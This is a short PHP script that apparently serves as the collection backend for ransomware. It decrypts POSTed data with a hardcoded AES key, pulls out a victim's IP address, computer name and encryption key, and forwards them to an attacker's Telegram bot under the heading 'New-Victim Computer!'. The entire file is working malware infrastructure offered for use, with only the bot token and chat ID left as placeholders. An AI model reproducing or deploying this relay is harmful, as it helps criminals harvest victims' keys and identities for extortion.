<?php
// Excepted key to decrypt data
$expectedKey = 'f3a9ed6dbe870d165df1502dd4fb2d9f';
$expectedIV = 'ff01f4ae6bb7917b';

// Check post data
if (!isset($_POST['data'])) {
    echo "Ha-Ha L00000l";
    exit;
}

// Receive encrypted data from POST-request
$encryptedData = $_POST['data'];

// Try to decrypt
$decryptedData = openssl_decrypt(base64_decode($encryptedData), 'AES-256-CBC', $expectedKey, OPENSSL_RAW_DATA, $expectedIV);
$dataParts = explode('|', $decryptedData);
list($API_IP, $PC, $key) = $dataParts;

// Parameters for send to telegram-bot
$botToken = 'YOUR-TELEGRAM-BOT-TOKEN';
$chatId = 'YOUR-TELEGRAM-CHAT-ID';
$message = "[🏴‍☠️] New-Victim Computer!\nIP: $API_IP\nPC: $PC\nKey: $key";

$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

$data = array(
    'chat_id' => $chatId,
    'text' => $message
);

$ch = curl_init($telegramUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

exit;
?>
